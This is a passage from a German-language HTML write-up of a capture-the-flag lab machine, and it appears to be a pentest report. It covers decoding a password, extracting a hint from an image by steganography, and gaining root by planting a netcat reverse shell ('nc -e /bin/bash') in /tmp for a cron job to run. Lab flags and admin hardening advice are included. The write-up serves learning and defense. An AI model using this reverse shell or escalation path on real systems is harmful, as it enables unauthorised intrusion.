+                    <div class="prompt" style="color: #ffffff;">paul@debian:~$ <span class="command">echo "KVEGGZ2QKQ2GOYLOKZ5GIRRZOZRG2VTGMJLTS6K2KY4WSWSXKZ4USQJ5HUFA" | base32 -d</span></div>
+                    <pre>base32: invalid input</pre> <!-- Übersetzung: Ungültige Eingabe -->
+                    <div class="prompt" style="color: #ffffff;">paul@debian:~$ <span class="command">echo "KVEGGZ2QKQ2GOYLOKZ5GIRRZOZRG2VTGMJLTS6K2KY4WSWSXKZ4USQJ5HUFA" | base64 -d</span></div>
+                    <pre>Pw => <span class="password">just_one_more_beer</span></pre>
+                    <div class="prompt" style="color: #ffffff;">paul@debian:~$ <span class="command">su nico</span></div>
+                    <pre>Password: <span class="password">just_one_more_beer</span></pre> <!-- Passwort eingegeben -->
+                     <div class="prompt" style="color: #ffffff;">nico@debian:/home/paul$ <span class="command"></span></div> <!-- Nico's Prompt -->
+                </div>
+            </div>
+        </section>
+
+         <section id="privilege-escalation-root">
+            <h2>Privilege Escalation (zu root via Stego & Cron/Tmp)</h2>
+             <p class="analysis">
+                <strong>Analyse:</strong> Als Benutzer `nico` wird das System weiter untersucht. Ein verstecktes Verzeichnis `/nico` wird gefunden, das die Datei `homer.jpg` enthält. Diese Datei wird über einen temporären Python-HTTP-Server auf den Angreifer-Rechner übertragen. Steganografie-Tools werden eingesetzt: `stegsnow` gibt eine Warnung aus, `stegseek` findet jedoch ohne Passwort eine versteckte Datei (`note.txt`) in `homer.jpg`. Der Inhalt der Datei ist ein Hinweis auf `/tmp/goodgame`.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Enumeration als `nico` führte zum Fund einer Bilddatei mit versteckten Informationen. Stegseek war erfolgreich bei der Extraktion des Hinweises auf `/tmp/goodgame`. Dies deutet stark auf einen geplanten Eskalationspfad hin, bei dem eine Datei oder ein Skript in `/tmp` von einem höher privilegierten Prozess (wahrscheinlich `root` via Cronjob) ausgeführt wird.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Erstelle eine ausführbare Datei namens `goodgame` im `/tmp`-Verzeichnis auf dem Zielsystem. Diese Datei sollte eine Reverse Shell oder einen anderen Payload enthalten, der Root-Rechte erlangt, wenn er ausgeführt wird. Warte dann auf die Ausführung (vermutlich durch einen Cronjob).
+                <br>
+                <strong>Empfehlung (Admin):</strong> Konfigurieren Sie Cronjobs sicher. Führen Sie keine Skripte aus von global beschreibbaren Verzeichnissen wie `/tmp`. Implementieren Sie Dateisystem-Härtung für `/tmp` (z.B. `noexec`-Mount-Option). Schulen Sie Benutzer bezüglich der Risiken von Steganografie.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <!-- Befehle als nico -->
+                    <div class="prompt" style="color: #ffffff;">nico@debian:/home/paul$ <span class="command">cd /</span></div>
+                    <div class="prompt" style="color: #ffffff;">nico@debian:/$ <span class="command">ls</span></div>
+                    <pre>bin  boot  dev  etc  home  lib lib64 media  mnt  nico  opt  proc  root  run  sbin  srv  sys  tmp  usr  var</pre>
+                    <div class="prompt" style="color: #ffffff;">nico@debian:/$ <span class="command">cd nico/</span></div>
+                    <div class="prompt" style="color: #ffffff;">nico@debian:/nico$ <span class="command">ls</span></div>
+                    <pre>homer.jpg</pre>
+                    <div class="prompt" style="color: #ffffff;">nico@debian:/nico$ <span class="command">python3 -m http.server 8000</span></div>
+                    <pre>Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</pre>
+                 </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                     <!-- Befehle auf Angreifer-Maschine -->
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wget http://192.168.2.132:8000/homer.jpg</span></div>
+                    <pre>
+--2023-04-16 01:45:10--  http://192.168.2.132:8000/homer.jpg
+Connecting to 192.168.2.132:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 137798 (135K) [image/jpeg]
+Saving to: ‘homer.jpg’
+
+homer.jpg           100%[===================>] 134.57K  --.-KB/s    in 0.1s
+
+2023-04-16 01:45:11 (1.06 MB/s) - ‘homer.jpg’ saved [137798/137798]
+                    </pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">stegsnow -C homer.jpg</span></div>
+                    <pre>Warning: residual of 3 bits not uncompressed</pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">stegseek homer.jpg /usr/share/wordlists/rockyou.txt</span></div>
+                    <pre>
+StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
+
+[i] Found passphrase: ""
+[i] Original filename: "note.txt".
+[i] Extracting to "homer.jpg.out".
+                    </pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat homer.jpg.out</span></div>
+                    <pre>my /tmp/goodgame file was so good... but I lost it</pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="proof-of-concept">
+             <h2>Proof of Concept (Root Access via /tmp/goodgame)</h2>
+             <p class="analysis">
+                <strong>Analyse:</strong> Basierend auf dem Hinweis aus der Steganografie wird als Benutzer `nico` eine ausführbare Datei `/tmp/goodgame` erstellt. Diese Datei enthält einen Netcat-Befehl, der eine Reverse Shell zum Angreifer-System (192.168.2.140, Port 4444 - *Achtung: IP weicht von der vorherigen Angreifer-IP 192.168.2.129 ab*) aufbaut. Auf dem Angreifer-System wird ein Netcat-Listener gestartet. Nach kurzer Wartezeit (ca. eine Minute laut Kommentar) verbindet sich die Shell, vermutlich weil ein Cronjob oder ein ähnlicher Mechanismus `/tmp/goodgame` als `root` ausführt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Plan war erfolgreich. Die Reverse Shell verbindet sich, und der `id`-Befehl bestätigt Root-Rechte (`uid=0(root)`). Das System ist vollständig kompromittiert. Der Root-Flag (`lasarnsilgam`) wird anschließend aus `/root/root.txt` gelesen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Ziel erreicht. Dokumentieren Sie den Pfad über Steganografie und die Ausnutzung des `/tmp`-Skripts.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Untersuchen und sichern Sie den Mechanismus (Cronjob, systemd Timer, etc.), der `/tmp/goodgame` ausführt. Führen Sie niemals Programme aus `/tmp` oder anderen von unprivilegierten Benutzern beschreibbaren Verzeichnissen mit Root-Rechten aus. Konfigurieren Sie `/tmp` mit `noexec`. Überprüfen Sie regelmäßig geplante Aufgaben auf Sicherheitsrisiken.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <!-- Befehle als nico -->
+                     <div class="prompt" style="color: #ffffff;">nico@debian:/tmp$ <span class="command">echo "nc -e /bin/bash 192.168.2.140 4444" > goodgame</span></div> <!-- IP 192.168.2.140 hier verwendet! -->
+                     <div class="prompt" style="color: #ffffff;">nico@debian:/tmp$ <span class="command">chmod +x goodgame</span></div>
+                    <pre>
+# (Wartezeit für Cronjob/Mechanismus)
+                    </pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                     <!-- Listener auf Angreifer-Maschine (IP 192.168.2.140?) -->
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                    <pre>
+listening on [any] 4444 ...
+connect to [192.168.2.140] from (UNKNOWN) [192.168.2.132] 56928 # Verbindung kommt rein
+<span class="command">id</span>
+uid=0(root) gid=0(root) groups=0(root) # Root Rechte!
+<span class="command">cd /root</span>
+<span class="command">ls</span>
+root.txt
+<span class="command">cat root.txt</span>
+<span class="password">lasarnsilgam</span>
+                    </pre>
+                </div>
+            </div>
+        </section>
+
+       <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command">cat user.txt</div> <!-- Fundort nicht im Text dokumentiert -->
+                    <div class="flag-value"><span class="password">gamhanarhu</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">cat root.txt</div>
+                    <div class="flag-value"><span class="password">lasarnsilgam</span></div>
+                </div>
+            </div>
+        </section>
+
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 16. April 2023</p> <!-- Datum aus Nmap/Hydra/John Kontext -->
+    </footer>
+</body>
+</html>
